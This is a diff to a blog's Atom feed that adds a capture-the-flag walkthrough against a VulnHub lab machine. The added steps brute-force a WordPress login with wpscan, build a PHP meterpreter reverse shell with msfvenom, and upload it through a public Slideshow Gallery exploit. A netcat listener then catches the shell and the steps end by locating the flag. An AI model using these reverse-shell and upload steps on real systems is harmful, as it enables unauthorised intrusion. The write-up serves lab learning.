@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-04-29T16:33:08-05:00</updated>
+  <updated>2016-04-29T17:15:03-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -96,6 +96,30 @@
 <p><code>wpscan --url 192.168.56.223/bull --wordlist out.txt --username bully</code></p>
 
 <p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Now, create php reverse shell:</p>
+
+<p><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.223 -a php --platform php -o evil.php</code></p>
+
+<p>based one wpscan scan result, the wordpress slideshow gallery shell upload exploit(<a href="https://www.exploit-db.com/exploits/34681/">https://www.exploit-db.com/exploits/34681/</a>) is found. Save it as <code>wp_gallery.py</code></p>
+
+<p>run:</p>
+
+<p><code>python wp_gallery.py -t http://192.168.56.223/bull -u bully -p Bighornedbulls -f evil.php</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>set netcat
+<code>nc -nlvp 1234</code></p>
+
+<p>visit <code>http://192.168.56.223/bull/wp-content/uploads/slideshow-gallery/evil.php</code></p>
+
+<p>get the meterpreter</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>locate flag.txt:
+<code>locate flag.txt</code> and get the result <code>/var/www/html/flag.txt</code></p>
 ]]></content>
   </entry>
   
